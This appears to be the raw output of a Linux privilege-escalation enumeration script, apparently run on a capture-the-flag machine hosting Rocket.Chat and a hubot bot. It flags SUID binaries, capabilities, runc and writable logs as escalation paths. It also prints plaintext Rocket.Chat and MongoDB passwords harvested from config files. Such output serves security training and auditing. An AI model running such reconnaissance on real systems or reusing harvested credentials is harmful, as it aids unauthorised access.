drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/merge-anything/.github
drwxr-xr-x 2 rocketchat rocketchat 74 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/babel-compiler/node_modules/call-bind/.github
drwxr-xr-x 2 rocketchat rocketchat 74 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/babel-compiler/node_modules/get-intrinsic/.github                                                                                                                                                         
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/babel-compiler/node_modules/has-symbols/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/babel-compiler/node_modules/object.assign/.github                                                                                                                                                         
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/logging/node_modules/cli-color/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/logging/node_modules/d/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/logging/node_modules/es5-ext/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/logging/node_modules/es6-symbol/.github
drwxr-xr-x 2 rocketchat rocketchat 63 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/mime/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/needle/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/node-releases/.github
drwxr-xr-x 2 rocketchat rocketchat 26 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/npm-normalize-package-bin/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.entries/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.entries/node_modules/es-abstract/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.entries/node_modules/es-to-primitive/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.entries/node_modules/has-symbols/.github
drwxr-xr-x 3 rocketchat rocketchat 63 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.entries/node_modules/is-callable/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.entries/node_modules/is-regex/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.values/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.values/node_modules/es-abstract/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.values/node_modules/es-to-primitive/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.values/node_modules/has-symbols/.github
drwxr-xr-x 3 rocketchat rocketchat 63 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.values/node_modules/is-callable/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/object.values/node_modules/is-regex/.github
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/react-app-polyfill/node_modules/promise/.github
drwxr-xr-x 2 rocketchat rocketchat 63 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/redis/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimend/.github
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimend/node_modules/es-abstract/.github                                                                                                                                                        
drwxr-xr-x 2 rocketchat rocketchat 25 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimend/node_modules/es-to-primitive/.github                                                                                                                                                    
drwxr-xr-x 3 rocketchat rocketchat 42 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimend/node_modules/has-symbols/.github                                                                                                                                                        
drwxr-xr-x 3 rocketchat rocketchat 63 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimend/node_modules/is-callable/.github                                                                                                                                                        
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimend/node_modules/is-regex/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimleft/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimright/.github
drwxr-xr-x 3 rocketchat rocketchat 23 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/string.prototype.trimstart/.github



drwx------ 8 dwight dwight 163 Jul  3  2021 /home/dwight/hubot/.git

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                               
netpgpkeys Not Found
netpgp Not Found                                                                                                                                           
                                                                                                                                                           
-r--r-----. 1 root root 1147 Apr 20  2018 /etc/insights-client/redhattools.pub.gpg
-rw------- 1 dwight dwight 1200 Jul  3  2021 /home/dwight/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 9551 Jun 22  2018 /usr/lib/systemd/import-pubring.gpg
-rw-r--r-- 1 root root 3290 Jan  1  2020 /usr/share/gnupg/distsigkey.gpg
-rw-------. 1 root root 1200 Jul  3  2021 /var/cache/PackageKit/8/metadata/AppStream-8-x86_64/gpgdir/trustdb.gpg
-rw-------. 1 root root 1200 Jul  3  2021 /var/cache/PackageKit/8/metadata/BaseOS-8-x86_64/gpgdir/trustdb.gpg
-rw------- 1 root root 1200 Jul  3  2021 /var/cache/PackageKit/8/metadata/epel-8-x86_64/gpgdir/trustdb.gpg
-rw------- 1 root root 1200 Jul  3  2021 /var/cache/PackageKit/8/metadata/epel-modular-8-x86_64/gpgdir/trustdb.gpg
-rw-------. 1 root root 1200 Jul  3  2021 /var/cache/PackageKit/8/metadata/extras-8-x86_64/gpgdir/trustdb.gpg
-rw------- 1 root root 1200 Jul  3  2021 /var/cache/PackageKit/8/metadata/mongodb-org-4.0-8-x86_64/gpgdir/trustdb.gpg
-rw------- 1 root root 1200 Jul  3  2021 /var/cache/PackageKit/8/metadata/nodesource-8-x86_64/gpgdir/trustdb.gpg

drwx------ 3 dwight dwight 69 Apr 21 10:04 /home/dwight/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)
-rw-r--r-- 1 rocketchat rocketchat 16384 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/meteor/konecty_user-presence/node_modules/colors/lib/.colors.js.swp
-rw-r--r-- 1 rocketchat rocketchat 16384 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/sharp/node_modules/semver/bin/.semver.js.swp
-rw-r--r-- 1 rocketchat rocketchat 16384 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/tar/lib/.mkdir.js.swp


╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                                    
runc was found in /usr/bin/runc, you may be able to escalate privileges with it                                                                            

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation                                         
-rw-r--r-- 1 root root 1261 Apr 30  2018 /usr/local/lib/node_modules/hubot-rocketchat/Dockerfile                                                           


╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-------. 1 root root 18861 Jun 29  2021 /etc/snmp/snmpd.conf                                                                                            

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r--. 1 root root 675 Apr 27  2017 /usr/share/bash-completion/completions/postfix                                                                    


╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 dwight dwight 258 Sep 16  2021 /home/dwight/hubot/.env                                                                                        
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1

╔══════════╣ Analyzing Rocketchat Files (limit 70)
lrwxrwxrwx. 1 root root 42 Jul  3  2021 /etc/systemd/system/multi-user.target.wants/rocketchat.service -> /usr/lib/systemd/system/rocketchat.service       
Environment=MONGO_URL=mongodb://rocket:my$ecretPass@localhost:27017/rocketchat?replicaSet=rs01&authSource=rocketchat
Environment=MONGO_OPLOG_URL=mongodb://rocket:my$ecretPass@localhost:27017/local?replicaSet=rs01&authSource=admin
Environment=ROOT_URL=http://chat.office.paper
Environment=PORT=48320
Environment=BIND_IP=127.0.0.1
Environment=DEPLOY_PLATFORM=rocketchatctl
-rw-r--r-- 1 root root 673 Feb  1 09:25 /usr/lib/systemd/system/rocketchat.service
Environment=MONGO_URL=mongodb://rocket:my$ecretPass@localhost:27017/rocketchat?replicaSet=rs01&authSource=rocketchat
Environment=MONGO_OPLOG_URL=mongodb://rocket:my$ecretPass@localhost:27017/local?replicaSet=rs01&authSource=admin
Environment=ROOT_URL=http://chat.office.paper
Environment=PORT=48320
Environment=BIND_IP=127.0.0.1
Environment=DEPLOY_PLATFORM=rocketchatctl

╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r--. 1 root root 856 May  9  2017 /usr/share/bash-completion/completions/bind                                                                       
-rw-r--r--. 1 root root 856 May  9  2017 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Strapi Files (limit 70)
drwxr-xr-x 2 rocketchat rocketchat 22 Jul  1  2021 /opt/Rocket.Chat/programs/server/npm/node_modules/katex/src/environments                                







╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r--r--. 1 root root 4787626 Apr 21 07:23 /var/log/access.log                                                                                           

-rw-r--r--. 1 root root 2048396 Apr 21 07:23 /var/log/error.log

╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                           





















-rw-r--r--. 1 root root 269 Jul  3  2021 /etc/my.cnf









-rw-r--r-- 1 root root 475 Aug  9  2021 /usr/lib/firewalld/services/vnc-server.xml


















╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r--. 1 root root 376 Jul 27  2021 /etc/skel/.bashrc                                                                                                 
-rw-r--r-- 1 dwight dwight 358 Jul  3  2021 /home/dwight/.bashrc











                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════                                                    
                                         ╚═══════════════════╝                                                                                             
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                
-rwsr-xr-x. 1 root root 38K May 11  2019 /usr/bin/fusermount                                                                                               
-rwsr-xr-x 1 root root 78K Aug 18  2021 /usr/bin/chage
-rwsr-xr-x 1 root root 83K Aug 18  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 43K Aug 18  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 50K Jul 21  2021 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 49K Jul 21  2021 /usr/bin/su
-rwsr-xr-x 1 root root 33K Jul 21  2021 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 65K Nov  8  2019 /usr/bin/crontab
-rwsr-xr-x 1 root root 33K Apr  6  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rws--x--x 1 root root 33K Jul 21  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rws--x--x 1 root root 25K Jul 21  2021 /usr/bin/chsh
-rwsr-xr-x. 1 root root 61K May 11  2019 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
---s--x--x 1 root root 162K Oct 25 10:30 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 34K May 11  2019 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 12K Nov  8 01:39 /usr/sbin/grub2-set-bootflag (Unknown SUID binary)
-rwsr-xr-x 1 root root 12K May  7  2021 /usr/sbin/pam_timestamp_check
-rwsr-xr-x 1 root root 37K May  7  2021 /usr/sbin/unix_chkpwd
-rws--x--x 1 root root 45K Aug 27  2021 /usr/sbin/userhelper
-rwsr-xr-x 1 root root 196K Jul 30  2021 /usr/sbin/mount.nfs
-rwsr-xr-x. 1 root root 18K May 11  2019 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-x--- 1 root dbus 63K May  8  2021 /usr/libexec/dbus-1/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 17K Dec 21 15:04 /usr/libexec/qemu-bridge-helper (Unknown SUID binary)
-rwsr-x--- 1 root 973 58K Sep 10  2021 /usr/libexec/cockpit-session (Unknown SUID binary)
-rwsr-x--- 1 root sssd 161K Dec 21 15:14 /usr/libexec/sssd/krb5_child (Unknown SUID binary)
-rwsr-x--- 1 root sssd 96K Dec 21 15:14 /usr/libexec/sssd/ldap_child (Unknown SUID binary)
-rwsr-x--- 1 root sssd 25K Dec 21 15:14 /usr/libexec/sssd/proxy_child (Unknown SUID binary)
-rwsr-x--- 1 root sssd 55K Dec 21 15:14 /usr/libexec/sssd/selinux_child (Unknown SUID binary)
-rwsr-xr-x 1 root root 21K Feb  2  2021 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper (Unknown SUID binary)
-rwsr-xr-x 1 root root 13K Jun 10  2021 /usr/libexec/Xorg.wrap

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                
-rwxr-sr-x 1 root tty 21K Jul 21  2021 /usr/bin/write                                                                                                      
-rwx--s--x. 1 root slocate 48K May 11  2019 /usr/bin/locate
-rwx--s--x. 1 root lock 22K May 11  2019 /usr/sbin/lockdev
-rwx--s--x. 1 root utmp 14K May 10  2019 /usr/libexec/utempter/utempter
-r-xr-sr-x 1 root ssh_keys 445K Jul 13  2021 /usr/libexec/openssh/ssh-keysign

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                                                        
/etc/ld.so.conf                                                                                                                                            
include ld.so.conf.d/*.conf
ld.so.conf.d
  ld.so.conf.d/*
cat: 'ld.so.conf.d/*': No such file or directory

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                 
Current capabilities:                                                                                                                                      
Current: =
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

Shell capabilities:
0x0000000000000000=
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

Files with capabilities (limited to 50):
/usr/bin/newgidmap = cap_setgid+ep
/usr/bin/newuidmap = cap_setuid+ep
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/mtr-packet = cap_net_raw+ep
/usr/libexec/mysqld = cap_sys_nice+ep

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                                                         
files with acls in searched folders Not Found                                                                                                              
                                                                                                                                                           
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                                                      
/usr/bin/lesspipe.sh                                                                                                                                       
/usr/bin/amuFormat.sh
/usr/bin/gettext.sh
/usr/bin/setup-nsssysinit.sh
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Unexpected in /opt (usually empty)
total 0                                                                                                                                                    
drwxr-xr-x.  3 root       root        25 Jun 22  2021 .
dr-xr-xr-x. 17 root       root       244 Jan 17 11:37 ..
drwxr-xr-x   4 rocketchat rocketchat 107 Jan 14 06:02 Rocket.Chat

╔══════════╣ Unexpected in root
/.autorelabel                                                                                                                                              

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                                                               
total 124                                                                                                                                                  
drwxr-xr-x.   2 root root 4096 Jan 14 04:53 .
drwxr-xr-x. 145 root root 8192 Apr 21 07:08 ..
-rw-r--r--.   1 root root  664 May 11  2019 bash_completion.sh
-rw-r--r--.   1 root root  196 May 10  2019 colorgrep.csh
-rw-r--r--.   1 root root  201 May 10  2019 colorgrep.sh
-rw-r--r--.   1 root root 1741 Jul 14  2021 colorls.csh
-rw-r--r--.   1 root root 1606 Jul 14  2021 colorls.sh
-rw-r--r--.   1 root root  162 May 10  2019 colorxzgrep.csh
-rw-r--r--.   1 root root  183 May 10  2019 colorxzgrep.sh
-rw-r--r--.   1 root root  216 Jan 13  2021 colorzgrep.csh
-rw-r--r--.   1 root root  220 Jan 13  2021 colorzgrep.sh
-rw-r--r--.   1 root root   80 May 15  2020 csh.local
-rw-r--r--.   1 root root  813 Jan 13  2021 flatpak.sh
-rw-r--r--.   1 root root 1107 Dec 14  2017 gawk.csh
-rw-r--r--.   1 root root  757 Dec 14  2017 gawk.sh
-rw-r--r--.   1 root root  102 Oct 15  2021 iproute2.sh
-rw-r--r--.   1 root root 2486 May 15  2020 lang.csh
-rw-r--r--.   1 root root 2312 May 15  2020 lang.sh
-rw-r--r--.   1 root root  500 May 11  2019 less.csh
-rw-r--r--.   1 root root  253 May 11  2019 less.sh
-rw-r--r--.   1 root root 1336 Jun 15  2020 PackageKit.sh
-rw-r--r--.   1 root root   81 May 15  2020 sh.local
-rw-r--r--.   1 root root  204 May  8  2021 ssh-x-forwarding.csh
-rw-r--r--.   1 root root  225 May  8  2021 ssh-x-forwarding.sh
-rw-r--r--.   1 root root  106 Sep 22  2021 vim.csh
-rw-r--r--.   1 root root  248 Sep 22  2021 vim.sh
-rw-r--r--.   1 root root 2092 Jun 16  2020 vte.sh
-rw-r--r--.   1 root root  120 May 17  2021 which2.csh
-rw-r--r--.   1 root root  478 May 17  2021 which2.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                                                                 
                                                                                                                                                           
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                               
═╣ Credentials in fstab/mtab? ........... No                                                                                                               
═╣ Can I read shadow files? ............. No                                                                                                               
═╣ Can I read shadow plists? ............ No                                                                                                               
═╣ Can I write shadow plists? ........... No                                                                                                               
═╣ Can I read opasswd file? ............. No                                                                                                               
═╣ Can I write in network-scripts? ...... No                                                                                                               
═╣ Can I read root folder? .............. No                                                                                                               
                                                                                                                                                           
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                     
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/sys/fs/cgroup/systemd/user.slice/user-1004.slice/user@1004.service                                                                                        

╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                           
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/mongodb/mongod.log                                                                                                                                
/var/log/messages
/var/log/cron
/var/log/secure
/var/tmp/dnf-dwight-1iw6tkrd/dnf.log
/var/tmp/dnf-dwight-1iw6tkrd/dnf.librepo.log
/var/tmp/dnf-dwight-1iw6tkrd/dnf.rpm.log
/var/tmp/dnf-dwight-1iw6tkrd/expired_repos.json
/var/tmp/dnf-dwight-1iw6tkrd/hawkey.log
/home/dwight/.dbshell
/home/dwight/hubot/.hubot.log

╔══════════╣ Writable log files (logrotten) (limit 100)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                                                       
logrotate 3.14.0                                                                                                                                           

    Default mail command:       /bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/logrotate.status
    ACL support:                yes
    SELinux support:            yes
Writable: /var/tmp/dnf-dwight-1iw6tkrd/dnf.log
Writable: /var/tmp/dnf-dwight-1iw6tkrd/dnf.librepo.log                                                                                                     
Writable: /var/tmp/dnf-dwight-1iw6tkrd/dnf.rpm.log                                                                                                         
Writable: /home/dwight/.npm/_logs/2021-07-03T11_22_16_966Z-debug.log                                                                                       
Writable: /home/dwight/.npm/_logs/2021-07-03T11_22_42_745Z-debug.log                                                                                       
Writable: /home/dwight/.npm/_logs/2021-07-03T11_23_22_172Z-debug.log                                                                                       
Writable: /home/dwight/hubot/node_modules_bak/node_modules.bak/log/examples/file.log                                                                       
Writable: /home/dwight/hubot/node_modules_bak/log/examples/file.log                                                                                        
Writable: /home/dwight/hubot/node_modules/log/examples/file.log                                                                                            
Writable: /home/dwight/hubot/.hubot.log                                                                                                                    
                                                                                                                                                           
╔══════════╣ Files inside /home/dwight (limit 20)
total 40                                                                                                                                                   
drwx------  11 dwight dwight  310 Apr 21 09:53 .
drwxr-xr-x.  3 root   root     20 Jan 14 06:50 ..
lrwxrwxrwx   1 dwight dwight    9 Jul  3  2021 .bash_history -> /dev/null
-rw-r--r--   1 dwight dwight   18 May 10  2019 .bash_logout
-rw-r--r--   1 dwight dwight  141 May 10  2019 .bash_profile
-rw-r--r--   1 dwight dwight  358 Jul  3  2021 .bashrc
-rwxr-xr-x   1 dwight dwight 1174 Sep 16  2021 bot_restart.sh
drwx------   6 dwight dwight   70 Apr 21 09:05 .config
-rw-------   1 dwight dwight   27 Apr 21 10:04 .dbshell
-rw-------   1 dwight dwight   16 Jul  3  2021 .esd_auth
drwx------   3 dwight dwight   69 Apr 21 10:04 .gnupg
drwx------   8 dwight dwight 4096 Apr 21 09:51 hubot
-rw-rw-r--   1 dwight dwight   18 Sep 16  2021 .hubot_history
drwx------   3 dwight dwight   19 Jul  3  2021 .local
drwxr-xr-x   4 dwight dwight   39 Jul  3  2021 .mozilla
drwxrwxr-x   5 dwight dwight   83 Jul  3  2021 .npm
drwxr-xr-x   4 dwight dwight   32 Jul  3  2021 sales
drwx------   2 dwight dwight    6 Sep 16  2021 .ssh
-r--------   1 dwight dwight   33 Apr 21 07:09 user.txt
drwxr-xr-x   2 dwight dwight   24 Sep 16  2021 .vim
-rw-rw-r--   1 dwight dwight    5 Apr 21 09:02 weird

╔══════════╣ Files inside others home (limit 20)
                                                                                                                                                           
╔══════════╣ Searching installed mail applications
                                                                                                                                                           
╔══════════╣ Mails (limit 50)
  9281720      0 -rw-rw----   1  rpc      mail            0 Jul  3  2021 /var/mail/rpc                                                                     
 10152432      0 -rw-rw----   1  1000     mail            0 Jul  3  2021 /var/mail/nick
 11176001      0 -rw-rw----   1  rocketchat mail            0 Jul  3  2021 /var/mail/rocketchat
 11074260      0 -rw-rw----   1  1002     mail            0 Jul  3  2021 /var/mail/dwight
  9220466      0 -rw-rw----   1  1005     mail            0 Sep 16  2021 /var/mail/secnigma
  9281720      0 -rw-rw----   1  rpc        mail            0 Jul  3  2021 /var/spool/mail/rpc
 10152432      0 -rw-rw----   1  1000     mail            0 Jul  3  2021 /var/spool/mail/nick
 11176001      0 -rw-rw----   1  rocketchat mail            0 Jul  3  2021 /var/spool/mail/rocketchat
 11074260      0 -rw-rw----   1  1002     mail            0 Jul  3  2021 /var/spool/mail/dwight
  9220466      0 -rw-rw----   1  1005     mail            0 Sep 16  2021 /var/spool/mail/secnigma

╔══════════╣ Backup folders
                                                                                                                                                           
╔══════════╣ Backup files (limited 100)
-rw-r--r--. 1 root root 1498 May 13  2019 /etc/nsswitch.conf.bak                                                                                           
-rw-r--r--. 1 root root 163 Jul  3  2021 /etc/httpd/conf.d/office.htb.conf.bak
-rw-r--r--. 1 root root 8720 May 20  2021 /etc/httpd/conf.d/ssl.conf.bak
-rw-r--r--. 1 root root 2516 Jun  4  2019 /usr/lib/modules/4.18.0-80.el8.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
-rw-r--r--. 1 root root 2432 Dec 22 08:39 /usr/lib/modules/4.18.0-348.7.1.el8_5.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
-rw-r--r-- 2 root root 1393 Aug 12  2021 /usr/lib/python3.6/site-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.opt-1.pyc
-rw-r--r-- 2 root root 1393 Aug 12  2021 /usr/lib/python3.6/site-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 1775 Feb 25  2021 /usr/lib/python3.6/site-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 7138 Feb 13  2018 /usr/lib/node_modules/node-gyp/node_modules/form-data/README.md.bak
-rw-r--r-- 1 root root 7138 Jan 10 07:20 /usr/lib/node_modules/npm/node_modules/form-data/README.md.bak
-rwxr-xr-x. 1 root root 38024 Sep  1  2021 /usr/lib64/mysql/plugin/component_mysqlbackup.so
-rwxr-xr-x. 1 root root 8136 Sep  1  2021 /usr/lib64/mysql/plugin/component_test_backup_lock_service.so
-rwxr-xr-x. 1 root root 41808 May 27  2021 /usr/lib64/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 305 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_arp_ping_1.conf
-rw-r--r-- 1 root root 465 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_arp_ping_2.conf
-rw-r--r-- 1 root root 194 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_ethtool_1.conf
-rw-r--r-- 1 root root 212 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_ethtool_2.conf
-rw-r--r-- 1 root root 241 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_ethtool_3.conf
-rw-r--r-- 1 root root 447 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_multi_lw_1.conf
-rw-r--r-- 1 root root 285 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_nsna_ping_1.conf
-rw-r--r-- 1 root root 318 Jul 26  2020 /usr/share/doc/teamd/example_configs/activebackup_tipc.conf
-rw-r--r--. 1 root root 17711 Aug  6  2006 /usr/share/doc/mcpp/ChangeLog.old
-rw-r--r--. 1 root root 41508 Mar  9  2006 /usr/share/doc/pinfo/ChangeLog.old
-rw-r--r-- 1 root root 2670 Dec  8  2016 /usr/share/man/man1/db_hotbackup.1.gz
-r--r--r-- 1 root root 2900 Sep 22  2021 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r--. 1 root root 1815 Jul 29  2017 /usr/share/help/C/gnome-help/backup-check.page
-rw-r--r--. 1 root root 1999 Jan  5  2017 /usr/share/help/C/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 2356 Jan  5  2017 /usr/share/help/C/gnome-help/backup-how.page
-rw-r--r--. 1 root root 1320 Sep 18  2012 /usr/share/help/C/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 3318 Apr 11  2017 /usr/share/help/C/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 2505 Jan  5  2017 /usr/share/help/C/gnome-help/backup-what.page
-rw-r--r--. 1 root root 2268 Jul 29  2017 /usr/share/help/C/gnome-help/backup-where.page
-rw-r--r--. 1 root root 1262 Jan  5  2017 /usr/share/help/C/gnome-help/backup-why.page
-rw-r--r--. 1 root root 2615 May 13  2019 /usr/share/help/as/gnome-help/backup-check.page
-rw-r--r--. 1 root root 3643 May 13  2019 /usr/share/help/as/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 4242 May 13  2019 /usr/share/help/as/gnome-help/backup-how.page
-rw-r--r--. 1 root root 2601 May 13  2019 /usr/share/help/as/gnome-help/backup-restore.page
-rw-r--r--. 1 root root 4650 May 13  2019 /usr/share/help/as/gnome-help/backup-thinkabout.page
-rw-r--r--. 1 root root 4854 May 13  2019 /usr/share/help/as/gnome-help/backup-what.page
-rw-r--r--. 1 root root 3430 May 13  2019 /usr/share/help/as/gnome-help/backup-where.page
-rw-r--r--. 1 root root 1660 May 13  2019 /usr/share/help/as/gnome-help/backup-why.page
-rw-r--r--. 1 root root 2210 May 13  2019 /usr/share/help/ca/gnome-help/backup-check.page
-rw-r--r--. 1 root root 2674 May 13  2019 /usr/share/help/ca/gnome-help/backup-frequency.page
-rw-r--r--. 1 root root 3007 May 13  2019 /usr/share/help/ca/gnome-help/backup-how.page
-rw-r--r--. 1 root root 1740 May 13  2019 /usr/share/help/ca/gnome-help/backup-restore.page
